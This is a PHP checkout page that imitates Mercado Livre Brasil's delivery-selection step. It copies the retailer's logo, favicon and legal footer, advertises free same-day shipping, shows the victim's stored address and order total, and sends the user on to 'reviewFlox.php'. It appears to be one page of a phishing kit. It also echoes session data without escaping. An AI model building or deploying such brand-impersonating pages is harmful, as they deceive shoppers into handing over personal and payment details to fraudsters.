<?php 
session_start();
?>
 <title>Mercado Livre Brasil - Frete Grátis no mesmo dia</title>
    <link href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/favicon.svg" rel="icon" data-head-react="true"/>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
	<link rel="stylesheet" href="../css/style.css">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">	
</head>
<body style="background:rgb(238, 238, 238);">

	<header class="dasdaksldaskdadcoderphp">
		<div class="container">
			<div class="row">
				<div class="col-md-6 col-6">
					<img class="peukaskaks" src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.59/mercadolibre/logo-pt__large_25years_v2.png" alt="">
				</div>
				<div class="col-md-6 col-6">
					<p style="font-size:13px;cursor:pointer;position:relative;top:10px;float:right;">Contato</p>
				</div>
			</div>
		</div>
	</header>
	
	<aside>
		<div class="container">
			<br><br>
			 	<h1 style="font-size:1.6em;">Escolha a forma de entrega</h1>
			 <div class="row">
			 			 	 <div class="col-md-8">
			 	 	<div class="askdjkasjdkjddadosdrop">
			 	 	<div class="row" style="cursor:pointer;">
			 	 		<div class="col-md-6">
			 	 				<div class="form-check">
  <input class="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" checked>
  <label style="font-weight: 600;" class="form-check-label" for="flexRadioDefault2">
   
Enviar no meu endereço
  </label>
</div>

<br>

		 	 		<div class="form-check">
  
  <label class="form-check-label" for="flexRadioDefault2">
   
<?=$_SESSION['rua']?> <?=$_SESSION['cep']?> - <?=$_SESSION['estado']?> - <?=$_SESSION['cidade']?> <br>
<?=$_SESSION['casa']?>
  </label>
</div>
			 	 		</div>

			 	 		<div class="col-md-6">
			 	 			<p style="float:right;color:#00a650;">Grátis</p>
			 	 		</div>
			 	 	</div>
			 	 	
			 	 	</div><br>
			 	 	<button  onclick="window.location.href='reviewFlox.php'" style="maring-top:15px !important;" class="buttoncomprar">Continuar</button>


			 	 		</form>
</div>




			 	<div class="col-md-4">
	 <div class="asdlasdaskd92929202020202-22002022">
	 	<p style="font-weight: 600;">Resumo da compra</p>
	 	<hr>
	 	<div class="row">
	 		<div class="col-md-6 col-6"><span style="float:left;font-size:14px;">Produtos (<?= $_SESSION['qtdprodutos']?>)</span></div>
	 		<div class="col-md-6 col-6"><span style="float:right;font-size:14px;">R$ <?=number_format( $_SESSION['totalpreco'], 2, ',', '.');?></span></div>
	 		<div style="clear:both;"></div>
	 	</div><br>
	 	<div class="row">
	 		<div class="col-md-6 col-6"><span style="float:left;font-size:14px;">Frete</span></div>
	 		<div class="col-md-6 col-6"><span style="float:right;font-size:14px;color:#00a650;">Grátis

</span></div>
<div style="clear:both;"></div>
	 	</div>
	 	<hr>
	 	

	 	<div class="row">
	 		<div class="col-md-6 col-6"><span style="float:left;">Você pagará</span></div>
	 		<div class="col-md-6 col-6"><span style="float:right;"><strong>R$ <?=number_format( $_SESSION['totalpreco'], 2, ',', '.');?></strong>

</span></div>
	 	</div>
	 </div>
</div>
	


			 	 </div>
			 </div>
		</div>
	</aside>

<br>

<footer class="aksdkjasdkasdfooter">
	<div class="container">
	<div class="row">
			<nav class="ansnansnansnav">
			<ul>
			<li>Trabalhe conosco
</li>
			<li>Termos e condições</li>
			<li>Promoções</li>
			<li>Como cuidamos da sua privacidade</li>
			<li>Acessibilidade</li>
			<li>Contato</li>
			<li>Informações sobre seguros</li>
			<li>
Programa de Afiliados
</li>
			<li>Black friday</li>

		</ul>
	</nav>
<br>
	<span style="font-size:12px;color:rgb(200,200,200);">Copyright © 1999-2024 Ebazar.com.br LTDA. <br> CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.</span>
	</div>
	</div>
</footer>


<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>	
</body>
</html>